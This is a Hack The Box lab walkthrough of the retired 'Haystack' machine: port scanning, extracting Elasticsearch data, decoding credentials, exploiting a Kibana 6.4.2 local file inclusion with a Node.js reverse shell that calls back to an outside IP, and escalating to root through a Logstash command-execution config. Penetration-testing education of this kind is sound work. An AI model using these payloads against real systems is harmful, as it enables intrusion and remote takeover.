---
layout: post
title: "Haystack: Hack The Box Walkthrough"
date: 2019-11-02 15:56:05 +0000
last_modified_at: 2019-11-02 15:56:05 +0000
category: Walkthrough
tags: ["Hack The Box", Haystack, retired]
comments: true
image:
  feature: haystack-htb-walkthrough.jpg
  credit: pixel2013 / Pixabay
  creditlink: https://pixabay.com/photos/needle-in-a-haystack-needle-haystack-1752846/
---

This post documents the complete walkthrough of Haystack, a retired vulnerable [VM][1] created by [JoyDragon][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Haystack is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.115 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-01 01:21:56 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.115                                    
Discovered open port 22/tcp on 10.10.10.115                                    
Discovered open port 9200/tcp on 10.10.10.115
```

Nothing unusual with the ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,9200 -A --reason -oN nmap.txt 10.10.10.115
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    syn-ack ttl 63 nginx 1.12.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    syn-ack ttl 63 nginx 1.12.2
|_http-favicon: Unknown favicon MD5: 6177BFB75B498E0BB356223ED76FFE43
| http-methods:
|   Supported Methods: HEAD DELETE GET OPTIONS
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
```

Interesting. `80/tcp` and `9200/tcp` appear to be Nginx `http` services. This is what they look like in a browser.

_`80/tcp`_


{% include image.html image_alt="5a95d4ce.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/5a95d4ce.png" %}


Needle in a haystack indeed :laughing:

_`9200/tcp`_


{% include image.html image_alt="b5a9da1e.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/b5a9da1e.png" %}


Now, this is interesting. Elasticsearch is in the house.

### How to use Elasticsearch

Let's see how we can find the needle in the haystack.

#### Listing all the indices in the node


{% include image.html image_alt="f6e78db9.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/f6e78db9.png" %}


Notice the size of the indices? Keep that in mind because we are going to use it later.

#### Listing all the documents in an index


{% include image.html image_alt="5598a9a6.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/5598a9a6.png" %}


By default, Elasticsearch displays ten results. In order to include all the results, we need the `size` parameter. Let's switch to `curl` and download the two indices.

```
# curl -s "http://10.10.10.115:9200/bank/_search?q=*:*&size=1000" > bank
# curl -s "http://10.10.10.115:9200/quotes/_search?q=*:*&size=1000" > quotes
```

### Analysis of `needle.jpg`

OK, what's next? In order to search for the needle in the haystack, we need to know what are we looking for in the first place. To do that, we turn our attention to `needle.jpg`.

Check out the `strings` in the file.


{% include image.html image_alt="de11d407.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/698df47d.png" %}


This string is `base64`-decoded to ***la aguja en el pajar es "clave"***. Damn, what does it even mean? Google Translate to the rescue.


{% include image.html image_alt="71114c93.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/71114c93.png" %}


Duh? :fu:

Anyways, that line is cliché and it looks like it's straight out of a book of quotations. :wink: With that in mind, let's see what we can find in the `quotes` index.


{% include image.html image_alt="b916c77e.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/b916c77e.png" %}


There's more.


{% include image.html image_alt="1302bba6.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/1302bba6.png" %}


They are decoded to the following:

```
pass: spanish.is.key
user: security
```

This must the key to SSH login. What do you know, the file `user.txt` is at the home directory.


{% include image.html image_alt="c70e59ba.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/c70e59ba.png" %}


## Privilege Escalation

During enumeration of `security`'s account, I noticed Kibana 6.4.2 is installed. This version coincides with the version first seen at the `9200/tcp` page.


{% include image.html image_alt="7bc39698.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/7bc39698.png" %}


This version is susceptible to a Local File Inclusion (LFI) that can be exploited to gain remote access, according to this [discovery](https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/).

It's not hard to exploit. First, create a reverse shell written in Node.js.

<div class="filename"><span>lame.js</span></div>

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.15.147", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

`scp` the file to a `tmpfs` mount, e.g. `/dev/shm`.

Launch the exploit with `curl` in the remote machine like so.

```
$ curl -s "http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../dev/shm/lame.js"
```

You should get a reverse shell as `kibana`.


{% include image.html image_alt="326409da.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/326409da.png" %}


You must be thinking, "what good is a shell as `kibana`?". Well, check out the permissions that `kibana` has.


{% include image.html image_alt="e26584b7.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/e26584b7.png" %}


And, check out the contents of `/etc/logstash/conf.d`.


{% include image.html image_alt="b4d8661e.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/b4d8661e.png" %}


First of all, the machine is running an Elasticsearch, Logstash, and Kibana (ELK) stack. Secondly, the input, filter and output plugins are geared towards execution.

### Getting `root.txt`

In addition, Logstash is running as `root`. The creator is so kind! :roll_eyes:


{% include image.html image_alt="cd961a11.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/cd961a11.png" %}


Armed with that insight, here's how we are going to get our `root` shell.

1. Use `msfvenom` to create a reverse shell, name it `lame`
2. `scp` to `/dev/shm/lame`
2. `echo "Ejecutar comando: /dev/shm/lame" > /opt/kibana/logstash_lame`
2. Wait and profit...


{% include image.html image_alt="8e17b5f3.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/8e17b5f3.png" %}


There you have it. Getting `root.txt` is trivial with a `root` shell.


{% include image.html image_alt="e0a66a2b.png" image_src="/553fa2a2-61b4-43df-98c3-49805e7e1ec1/e0a66a2b.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/195
[2]: https://www.hackthebox.eu/home/users/profile/32897
[3]: https://www.hackthebox.eu/
